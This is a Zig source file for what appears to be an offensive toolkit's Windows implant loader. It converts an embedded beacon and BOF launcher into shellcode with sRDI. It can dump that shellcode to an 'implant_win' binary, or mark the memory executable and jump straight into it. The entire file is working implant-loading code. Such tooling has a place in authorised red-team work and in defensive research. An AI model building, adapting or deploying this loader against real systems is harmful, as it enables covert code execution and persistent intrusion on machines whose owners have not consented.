const std = @import("std");
const w32 = @import("bof_launcher_win32");
const srdi = @import("srdi");

pub fn main() !void {
    const shellcode_bytes = try srdi.allocateShellcode(
        @embedFile("bof_launcher_lib_embed"),
        @embedFile("z_beacon_embed"),
        0,
        @import("builtin").cpu.arch,
    );
    defer srdi.freeShellcode(shellcode_bytes);

    var cmd_args_iter = try std.process.argsWithAllocator(std.heap.page_allocator);
    defer cmd_args_iter.deinit();

    _ = cmd_args_iter.skip(); // skip program name

    const dump_shellcode = blk: {
        if (cmd_args_iter.next()) |arg| {
            if (std.mem.eql(u8, arg, "--dump-shellcode")) {
                break :blk true;
            }
        }
        break :blk false;
    };

    if (dump_shellcode) {
        const file = try std.fs.cwd().createFile(
            "implant_win_" ++ (if (@import("builtin").cpu.arch == .x86_64) "x64" else "x86") ++ ".bin",
            .{},
        );
        defer file.close();
        var writer = file.writer(&.{});
        try writer.interface.writeAll(shellcode_bytes);
        try writer.interface.flush();
    } else {
        w32.init();

        var old_protection: w32.DWORD = 0;
        if (w32.VirtualProtect(
            @constCast(shellcode_bytes.ptr),
            4096,
            w32.PAGE_EXECUTE_READ,
            &old_protection,
        ) == w32.FALSE) return error.Win32Api;

        if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE)
            return error.Win32Api;

        @as(*const fn () callconv(.c) void, @ptrCast(shellcode_bytes.ptr))();

        // In Debug mode we restore memory protection to RW because Zig's memory allocator
        // does something like this: @memset(mem, undefined) when freeing it.
        if (@import("builtin").mode == .Debug) {
            if (w32.VirtualProtect(
                @constCast(shellcode_bytes.ptr),
                4096,
                w32.PAGE_READWRITE,
                &old_protection,
            ) == w32.FALSE) return error.Win32Api;

            if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE)
                return error.Win32Api;
        }
    }
}
